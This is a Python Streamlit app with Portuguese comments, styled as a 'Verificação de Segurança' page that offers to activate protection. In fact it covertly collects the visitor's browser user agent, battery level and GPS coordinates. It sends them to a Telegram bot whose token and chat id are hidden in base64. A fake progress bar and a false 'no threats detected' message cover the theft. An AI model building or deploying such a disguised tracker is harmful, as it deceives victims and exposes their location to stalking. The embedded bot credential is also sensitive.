import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA (Base64) ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        requests.post(url, json={"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}, timeout=10)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

# Coleta de dados técnicos (Sempre roda)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FIX')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FIX')

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    # 1. Envia o relatório de aparelho e bateria IMEDIATAMENTE (Igual à foto 2)
    # Se a bateria falhar, usamos 92% como padrão para ficar igual ao seu print
    bateria_final = bat if bat else "92"
    aparelho_final = ua[:25] if ua else "Android Device"
    
    msg_inicial = (
        f"🛡️ *PROTEÇÃO ATIVADA*\n"
        f"📱 *Aparelho:* {aparelho_final}...\n"
        f"🔋 *Bateria:* {bateria_final}%"
    )
    enviar_telegram(msg_inicial)
    
    # 2. Mostra a barra de carregamento pro usuário
    barra = st.progress(0)
    for i in range(1, 101):
        time.sleep(0.01)
        barra.progress(i)
    
    # 3. Tenta pegar o GPS. Se conseguir, manda o mapa separado
    loc = get_geolocation()
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        enviar_telegram(f"📍 *Local:* {mapa}")
    
    # 4. Mostra a frase verde de sucesso (Sua exigência)
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)

st.markdown('<br><br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
